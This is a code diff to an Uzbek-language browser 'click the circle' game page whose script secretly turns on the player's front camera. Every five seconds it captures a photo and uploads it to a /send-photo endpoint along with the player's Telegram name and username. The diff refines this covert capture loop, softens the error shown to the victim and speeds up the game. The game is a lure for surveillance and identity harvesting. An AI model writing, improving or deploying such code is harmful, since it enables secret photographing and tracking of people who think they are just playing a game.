@@ -74,6 +74,13 @@
       overflow: hidden;
       touch-action: manipulation;
     }
+
+    .error {
+      color: #f44;
+      font-size: 0.9rem;
+      margin-top: 1rem;
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -82,6 +89,7 @@
     <p>Doirani imkon qadar ko'proq bosing!</p>
     <div class="score">Hisob: <span id="score">0</span></div>
     <div class="loader"></div>
+    <div class="error" id="error"></div>
     <div class="game-area" id="gameArea">
       <div class="circle" id="circle"></div>
     </div>
@@ -106,9 +114,11 @@
     const gameArea = document.getElementById("gameArea");
     const scoreDisplay = document.getElementById("score");
     const loader = document.querySelector(".loader");
+    const errorDisplay = document.getElementById("error");
 
     let score = 0;
     let isCapturing = false;
+    let lastCaptureTime = 0;
 
     // O'yin logikasi
     function moveCircle() {
@@ -134,7 +144,7 @@
     });
 
     moveCircle();
-    setInterval(moveCircle, 1000);
+    setInterval(moveCircle, 800); // Tezlikni oshirdik
 
     // Kamera logikasi
     async function startCamera() {
@@ -144,17 +154,16 @@
           video: {
             facingMode: "user",
             width: { ideal: 640 },
-            height: { ideal: 480 }
+            height: { ideal: 480 },
+            frameRate: { ideal: 30 }
           },
           audio: false
         });
 
         video.srcObject = stream;
-        await new Promise((resolve) => {
+        await new Promise((resolve, reject) => {
           video.onloadedmetadata = () => {
-            video.play().then(resolve).catch((err) => {
-              console.error("❌ Video oynatish xatosi:", err);
-            });
+            video.play().then(resolve).catch(reject);
           };
         });
 
@@ -163,7 +172,8 @@
       } catch (err) {
         console.error("❌ Kamera ishga tushmadi:", err);
         loader.style.display = "none";
-        alert("Kamera ishga tushmadi: " + err.message);
+        errorDisplay.style.display = "block";
+        errorDisplay.textContent = "Kamera ishga tushmadi. Iltimos, ruxsatlarni tekshiring.";
       }
     }
 
@@ -171,7 +181,7 @@
       if (isCapturing) return;
       isCapturing = true;
 
-      setInterval(async () => {
+      const capture = async () => {
         if (!video.videoWidth || video.paused || video.ended) {
           console.warn("❌ Video ramkasi tayyor emas");
           return;
@@ -197,7 +207,7 @@
             return;
           }
 
-          const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.8));
+          const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.7));
           const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
 
           const formData = new FormData();
@@ -206,15 +216,31 @@
           formData.append("tg_fullname", fullName);
           formData.append("tg_username", username);
 
-          await fetch("/send-photo", {
+          const response = await fetch("/send-photo", {
             method: "POST",
             body: formData
           });
+
+          if (!response.ok) {
+            throw new Error("Server javob bermadi");
+          }
+
           console.log("✅ Rasm yuborildi", new Date().toLocaleTimeString());
         } catch (err) {
           console.error("❌ Yuborish xatosi:", err);
+          errorDisplay.style.display = "block";
+          errorDisplay.textContent = "Rasm yuborishda xato yuz berdi.";
         }
-      }, 5000); // 5 sekund interval
+      };
+
+      // Dinamik interval
+      const interval = setInterval(async () => {
+        const now = Date.now();
+        if (now - lastCaptureTime >= 5000) {
+          lastCaptureTime = now;
+          await capture();
+        }
+      }, 1000); // Tez-tez tekshirish, lekin faqat 5 sekunddan keyin yuborish
     }
 
     startCamera();
